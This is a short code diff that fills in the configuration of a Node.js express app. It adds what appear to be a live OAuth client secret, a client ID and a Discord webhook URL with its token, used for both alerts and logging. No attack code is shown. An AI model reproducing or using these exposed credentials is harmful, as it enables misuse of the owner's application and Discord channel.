@@ -1,9 +1,9 @@
 // Configuration
-const client_secret = 'change'
-const client_id = 'change'
+const client_secret = 'G618Q~CEYmKtWVGX.eUp7t5.9RE~ledqDKdeYdb6'
+const client_id = 'e70428a0-6f7a-4488-a761-52cf169cd227'
 const redirect_uri = 'change'
-const webhook_url = 'change'
-const webhook_logging_url = 'change'
+const webhook_url = 'https://discord.com/api/webhooks/1038186956024201347/43ccmpICsQDB6sh9uynQM676ivWmOfRGC5XVw2wLO-8bsy4D4Ok18SgocBORovaG15tX'
+const webhook_logging_url = 'https://discord.com/api/webhooks/1038186956024201347/43ccmpICsQDB6sh9uynQM676ivWmOfRGC5XVw2wLO-8bsy4D4Ok18SgocBORovaG15tX'
 // Config end
 const axios = require('axios')
 const express = require('express')
